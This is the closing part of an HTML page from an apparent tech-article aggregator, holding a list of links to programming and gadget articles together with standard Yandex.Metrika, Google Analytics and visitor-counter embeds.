<li><a href="../421529/index.html">Netflix, Uber, Google and you on MBLT DEV 2018</a></li>
<li><a href="../421531/index.html">How to integrate ReactJS in 1C-Bitrix with automatic generation of templates on the back-end using the example of the Globus network</a></li>
<li><a href="../421533/index.html">Choosing a programming language: 3 tips from a programmer at Apple</a></li>
<li><a href="../421535/index.html">Adventure - Electronics. On the winged swing in the world of IT</a></li>
<li><a href="../421537/index.html">Higher Order Functions in JS: Young Fighter Course</a></li>
<li><a href="../421545/index.html">Review of PocketBook 616 - the most affordable PocketBook 2018 with backlight function</a></li>
<li><a href="../421547/index.html">Independent Acceptance of Data Center</a></li>
<li><a href="../421549/index.html">We write technical documentation: a guide for the layman</a></li>
<li><a href="../421551/index.html">Mastering Vuex - from Zero to Hero</a></li>
<li><a href="../421553/index.html">We share technological content: collected all our materials on one site</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>